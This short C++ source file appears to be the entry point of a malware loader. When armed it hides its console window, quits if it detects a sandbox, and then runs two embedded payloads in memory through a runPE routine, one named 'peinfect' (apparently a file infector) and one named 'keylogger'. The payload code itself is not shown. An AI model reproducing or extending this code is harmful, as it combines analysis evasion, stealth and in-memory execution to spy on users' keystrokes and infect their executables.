#include "pch.h"
#include "example.h"

int example::start() {
	if constexpr (ARMED) FreeConsole();
	if (ARMED && sandboxdetect::is_sandboxed()) return 1;

	loadpe::runPE(raw::peinfect);
	loadpe::runPE(raw::keylogger);
	
	return 0;
}